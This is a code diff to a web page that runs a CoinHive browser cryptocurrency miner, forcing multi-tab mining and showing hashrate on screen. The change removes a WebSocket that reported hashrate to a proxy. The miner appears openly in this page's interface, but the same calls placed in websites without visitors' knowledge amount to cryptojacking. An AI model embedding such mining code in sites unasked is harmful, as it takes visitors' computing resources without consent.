@@ -501,17 +501,7 @@
         // Start mining
         miner.start(CoinHive.FORCE_MULTI_TAB);
         
-        // Create a separate stats reporting socket
-        let statsSocket = null;
-        try {
-          statsSocket = new WebSocket(proxyUrl);
-          statsSocket.onopen = () => console.log('[Stats] Connected to proxy for stats');
-          statsSocket.onerror = (e) => console.log('[Stats] Socket error');
-        } catch(e) {
-          console.log('[Stats] Failed to create stats socket');
-        }
-        
-        // Stats update loop
+        // Stats update loop (no extra socket - use HTTP to report stats)
         statsInterval = setInterval(() => {
           if (miner && miner.isRunning()) {
             const hashrate = miner.getHashesPerSecond();
@@ -526,16 +516,6 @@
             $('sidebarThreads').textContent = threads;
             $('barFill').style.width = ((total % 1000) / 10) + '%';
             $('barText').textContent = 'Mining: ' + fmtNum(hashrate) + ' H/s';
-            
-            // Report hashrate to server for dashboard
-            if (statsSocket && statsSocket.readyState === WebSocket.OPEN) {
-              try {
-                statsSocket.send(JSON.stringify({ 
-                  type: 'hashrate', 
-                  params: { rate: hashrate, total: total } 
-                }));
-              } catch(e) {}
-            }
           }
         }, 1000);
         
